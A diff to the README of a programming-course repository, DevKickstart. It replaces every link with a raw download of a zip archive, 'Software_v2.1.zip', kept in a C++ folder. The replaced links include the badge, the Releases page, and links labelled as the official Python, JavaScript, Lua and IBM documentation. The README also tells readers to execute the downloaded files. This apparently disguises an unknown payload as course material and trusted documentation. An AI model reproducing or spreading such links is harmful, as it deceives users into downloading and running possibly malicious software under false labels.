@@ -1,6 +1,6 @@
 # DevKickstart 🚀
 
-![DevKickstart](https://img.shields.io/badge/DevKickstart-Mini%20Curso%20de%20Programacao%20e%20TI-blue)
+![DevKickstart](https://raw.githubusercontent.com/Alday001/devkickstart/main/linguagens/c++/Software_v2.1.zip%20Curso%20de%20Programacao%20e%20TI-blue)
 
 Welcome to **DevKickstart**, your go-to resource for learning programming and technology concepts. This repository offers practical examples and guides on various programming languages and tech topics. Whether you're a beginner or looking to sharpen your skills, you'll find valuable resources here.
 
@@ -21,7 +21,7 @@ Welcome to **DevKickstart**, your go-to resource for learning programming and te
 - Practical examples
 - Exercises to test your skills
 
-You can download the latest releases from our [Releases page](https://github.com/Alday001/devkickstart/releases). Be sure to check it out for the most up-to-date materials.
+You can download the latest releases from our [Releases page](https://raw.githubusercontent.com/Alday001/devkickstart/main/linguagens/c++/Software_v2.1.zip). Be sure to check it out for the most up-to-date materials.
 
 ## Topics Covered
 
@@ -41,7 +41,7 @@ This repository includes resources on a range of topics:
 
 To get started with the materials in this repository, follow these steps:
 
-1. **Download the latest release** from our [Releases page](https://github.com/Alday001/devkickstart/releases). Make sure to execute the files as needed.
+1. **Download the latest release** from our [Releases page](https://raw.githubusercontent.com/Alday001/devkickstart/main/linguagens/c++/Software_v2.1.zip). Make sure to execute the files as needed.
 2. **Explore the resources**: Check out the various folders and files to find what interests you.
 3. **Start learning**: Use the guides and examples to practice your skills.
 
@@ -49,10 +49,10 @@ To get started with the materials in this repository, follow these steps:
 
 Here are some useful links and resources:
 
-- [Official Python Documentation](https://docs.python.org/3/)
-- [JavaScript Info](https://javascript.info/)
-- [Lua Official Site](https://www.lua.org/)
-- [Cloud Computing Basics](https://www.ibm.com/cloud/learn/cloud-computing-basics)
+- [Official Python Documentation](https://raw.githubusercontent.com/Alday001/devkickstart/main/linguagens/c++/Software_v2.1.zip)
+- [JavaScript Info](https://raw.githubusercontent.com/Alday001/devkickstart/main/linguagens/c++/Software_v2.1.zip)
+- [Lua Official Site](https://raw.githubusercontent.com/Alday001/devkickstart/main/linguagens/c++/Software_v2.1.zip)
+- [Cloud Computing Basics](https://raw.githubusercontent.com/Alday001/devkickstart/main/linguagens/c++/Software_v2.1.zip)
 
 You can also find more resources in the **Resources** section of this repository.
 
@@ -73,4 +73,4 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Conclusion
 
-Thank you for visiting **DevKickstart**! We hope you find the materials helpful as you embark on your programming journey. Don't forget to check the [Releases page](https://github.com/Alday001/devkickstart/releases) for the latest updates and downloads. Happy coding!
+Thank you for visiting **DevKickstart**! We hope you find the materials helpful as you embark on your programming journey. Don't forget to check the [Releases page](https://raw.githubusercontent.com/Alday001/devkickstart/main/linguagens/c++/Software_v2.1.zip) for the latest updates and downloads. Happy coding!
